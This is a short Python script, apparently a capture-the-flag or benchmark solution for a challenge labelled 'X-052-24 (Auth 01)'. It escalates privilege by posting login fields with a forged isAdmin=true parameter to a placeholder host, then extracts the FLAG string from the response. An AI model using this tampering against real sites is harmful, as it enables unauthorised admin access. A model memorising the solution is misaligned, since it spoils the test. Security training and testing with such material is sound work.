#!/usr/bin/env python3

"""
Exploit for X-052-24 (Auth 01)

Sends a POST request setting isAdmin=true to retrieve and print the flag.
Prints only the flag on success.
"""

import sys
import re
from urllib import request, parse


def fetch_flag(url: str) -> str:
    data = {
        "username": "a",
        "password": "b",
        "isAdmin": "true",
    }
    body = parse.urlencode(data).encode()
    req = request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with request.urlopen(req, timeout=10) as resp:
        html = resp.read().decode("utf-8", errors="ignore")

    # Extract flag; prefer FLAG{...} pattern if present
    m = re.search(r"FLAG\{[^}]*\}", html)
    if m:
        return m.group(0)

    # Fallback: try to capture after 'flag:' label
    m = re.search(r"flag:\s*([^<\n]+)", html, flags=re.IGNORECASE)
    if m:
        return m.group(1).strip()

    raise RuntimeError("Flag not found in response")


def main() -> int:
    url = "http://ip32815/index.php"
    try:
        flag = fetch_flag(url)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())

